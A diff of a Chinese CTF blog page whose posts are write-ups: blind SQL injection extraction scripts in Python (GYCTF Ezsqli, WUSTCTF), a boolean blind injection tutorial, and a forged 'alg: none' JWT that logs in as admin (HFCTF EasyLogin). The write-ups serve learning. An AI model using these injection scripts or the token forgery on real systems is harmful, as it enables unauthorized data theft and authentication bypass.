@@ -71,6 +71,131 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-102" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-102/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:12.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-102/">GYCTF2020Ezsqli</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>是个盲注题<br>但是过滤了好多好多好多东西 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or union select（合在一起不行） information （这个被禁了基本只能盲注和无列名注入）</span><br></pre></td></tr></table></figure>
+
+<p>无列名注入 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">测试：</span><br><span class="line">id=2||1=1 返回nu1l</span><br><span class="line">id=2||1=2 返回v&amp;n </span><br><span class="line">真返nu1l 假返回v&amp;n</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/183.PNG?raw=true" alt="183.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/184.PNG?raw=true" alt="184.PNG"></p>
+<p>走脚本爆表名字<br>通过无列名注入 <strong>innodb引擎或者sys数据库</strong>可以使用但是只能拿到表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://a03e17c8-164f-47d2-8874-ccb3a48278d2.node4.buuoj.cn:81/&#x27;</span><br><span class="line">payload = &#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in range(32, 127):</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;id&#x27;: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in re.text:</span><br><span class="line">            result += chr(i)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>拿到表名</p>
+<p><strong>无列名注入：</strong></p>
+<p>类似于给列名取别的名字 取名字的同时进行查询数据<br>我的user表有三列 试一下无列名查找</p>
+<p>发现得到了一个虚拟表 列名分别为1，2，3 储存了user表的数据</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/186.PNG?raw=true" alt="186.PNG"></p>
+<p>注意：查询时语句的字段数必须和指定表中一样不能多不能少不然就等着报错吧</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/187.PNG?raw=true" alt="187.PNG"></p>
+<p>可以查询第二列的数据 虚拟表中列名都是1，2，3 所有查询语句得用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`2`</span><br></pre></td></tr></table></figure>
+
+<p>不能直接用2 末尾的n用来命名的可以随便字符 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/188.PNG?raw=true" alt="188.PNG"></p>
+<p>但是有时候`也会被过滤就得用到另取别名法</p>
+<p>此时构造的虚拟表列名就变成a，b，c 查询就可以直接通过abc来</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/189.PNG?raw=true" alt="189.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/190.PNG?raw=true" alt="190.PNG"></p>
+<p><strong>这边用ascii偏移比较两个字符串的大小</strong><br><strong>两个字符串的大小比较与长度没有关系都只会比较字符串首字符的ascii码来比较 不等式成立返回1 不成立返回0</strong><br>也就是说只会比较以此 也就是首字符 写一个循环 <strong>ascii从32 到128</strong> 与flag的字符一一对比 满足返回nu1l 输出符合条件的ascii码对应的字符<br>以此类推输出flag所有的字符<br>老样子 脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://e47846ae-bc04-445f-aab3-e51cec5018a0.node4.buuoj.cn/&#x27;</span><br><span class="line">def add(flag):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += flag</span><br><span class="line">    return res</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    for char in range(32, 127):</span><br><span class="line">        hexchar = add(flag + chr(char))</span><br><span class="line">        payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar)</span><br><span class="line">        #print(payload)</span><br><span class="line">        data = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag += chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>​                                                  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-102/" data-id="cksyl7wiw0006w4w7gwt0052e" data-title="GYCTF2020Ezsqli" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-101" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-101/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:09.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-101/">HFCTF2020EasyLogin</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一点php都没看见 那就只能是js了 <strong>f12 看到一个app.js</strong> 这是基于node.js的koa框架<br>然而这边什么都没有<br>百度找找koa框架的目录结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> controllers目录是项目控制器存放目录：接受请求，处理逻辑</span><br><span class="line">访问controllers/api.js发现处理逻辑</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">​    const secretid = global.secrets.length;</span><br><span class="line">​    global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">​    const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        token: token</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || !password) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">​    const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">​    console.log(sid)</span><br><span class="line"></span><br><span class="line">​    if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">​    const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">​    if(status) &#123;</span><br><span class="line">​        ctx.session.username = username;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        status</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">        throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">​    const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        flag</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    ctx.session.username = null;</span><br><span class="line">    ctx.rest(&#123;</span><br><span class="line">        status: true</span><br><span class="line">    &#125;)</span><br><span class="line">    await next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>需要admin 才能拿到flag</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是<strong>注册又没法注册admin</strong> 只能通过伪造我们是admin来登陆了<br>处理逻辑这边看到了<strong>jwt</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line">const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>伪造假的jwt <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a><br>跑jwtsecret那个跑不出来太慢了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;secretid&quot;: [],</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;123456&quot;,</span><br><span class="line">  &quot;iat&quot;: 1587632063</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiMTIzNDU2IiwiaWF0IjogMTU4NzYzMjA2M30.<br> 然后注册一个账号 登录过程抓包一下改一下</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/179.PNG?raw=true" alt="179.PNG"></p>
+<p>登陆成功抓一下get flag那个请求的包就能拿到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-101/" data-id="cksyl7wiv0005w4w73y9w6shh" data-title="HFCTF2020EasyLogin" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-100" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/13/page-100/" class="article-date">
@@ -567,112 +692,6 @@
 
 
   
-    <article id="post-page-92" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-92/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T03:58:41.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-92/">布尔盲注</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>盲注就是在页面无提供回显时的一种继续注入手段<br><strong>布尔型就是输入and 1 或者and 0 浏览器返回两个不同页面可以根据返回的页面来判断正确的数据信息</strong><br><strong>相关函数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br><span class="line">返回字符串的长度，以字节为单位，一个多字节字符算作多字节 就是假设一个包含3个双字节字符的字符串length()返回6 che_length() 返回3</span><br><span class="line">substr() </span><br><span class="line">从指定位置返回多少个字符 substr() 有三个参数 </span><br><span class="line">substr(字符串，从第几位开始，截取多长）</span><br><span class="line">mid也具有相似的功能用法一致</span><br><span class="line">ascii()</span><br><span class="line">输出某个字符的ascii码值 只能处理单个字符 字符串的话只能是第一个字符 配合substr使用效果很好</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/135.PNG?raw=true" alt="135.PNG"></p>
-<p>select ascii(substr(database(),1,1))&gt;114#    这边&gt;114可以改大于小于等于 114也可以改<br>我这边数据库是security</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/137.PNG?raw=true" alt="137.PNG"></p>
-<p>那么大于115就返回空 那么第一个字符就是ascii码为115的字符</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/138.PNG?raw=true" alt="138.PNG"></p>
-<p>接下去就可以从第二位</p>
-<p>select (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100查表</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/139.PNG?raw=true" alt="139.PNG"></p>
-<p>select (ascii(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)))&gt;100查列</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-92/" data-id="cksyl7wk6002bw4w7b6rxhhqm" data-title="布尔盲注" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-91" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-91/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T03:58:39.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-91/">WUSTCTF2020颜值成绩查询</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>首先题目说了查询那正常是sql注入<br>在搜索框输入1 2 3 4 页面均有变化其他的都没有<br>各种’ “ 之类的符号都没有什么回显</p>
-<p>试一下布尔盲注</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;1,1,0) </span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/133.PNG?raw=true" alt="133.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;3,1,0) </span><br><span class="line">无回显</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/134.PNG?raw=true" alt="134.PNG"></p>
-<p>爆表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_+=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(table_name),&#123;&#125;,1))from/**/information_schema.tables/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p>爆字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(column_name),&#123;&#125;,1))from/**/information_schema.columns/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p>爆值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(value),&#123;&#125;,1))from/**/flag)=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-91/" data-id="cksyl7wk5002aw4w78ur8f31k" data-title="WUSTCTF2020颜值成绩查询" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -696,7 +715,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -709,6 +728,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -718,14 +745,6 @@
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
